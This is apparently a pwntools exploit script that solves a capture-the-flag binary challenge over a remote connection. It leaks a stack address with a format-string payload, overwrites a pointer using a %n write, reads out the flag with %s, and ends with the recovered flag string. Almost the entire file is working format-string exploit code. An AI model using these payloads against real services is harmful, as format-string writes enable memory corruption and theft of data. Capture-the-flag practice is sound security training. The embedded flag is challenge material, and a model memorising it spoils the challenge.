import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chal'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn='54.85.45.101 8007')
# r = Pwn(PROG)

# Identify stack pointer on the stack
pay = '|'.join([f'0x%{i}$lx' for i in [54]])
r.sl(pay)
r.ru(b'command\n')
stack = int(r.rl().strip()[2:], 16)
log.info('Writing over this stack addr: ' + hex(stack))

# COMMENTED OUT  below because only need to retrieve once

# Overwrite to flag holder (see in binary)
# flag = 0xaaaa
# flag_holder = 0x4070c8
# flag = 0x404018
# pay = f'%{flag}c%54$n'
# r.sl(pay)
# r.ru(b'command\n')

# Print out contents of flag holder to actually obtain pointer to flag.
# pay = b'%60$s'
# r.sl(pay)
# r.ru(b'command\n')
# flag = u64(r.rb(3).ljust(8, b'\x00'))
# log.info('Flag ptr: ' + hex(flag))

flag = 0x404018
pay = f'%{flag}c%54$n'
r.sl(pay)
r.ru(b'command\n')

pay = b'%60$s'
r.sl(pay)
r.ru(b'command\n')
print(r.rl())

r.prog.close()

# flag{u_r_b3st_numb3r_0ne_f4st3st_2048_champi0n_0f_all_tim3}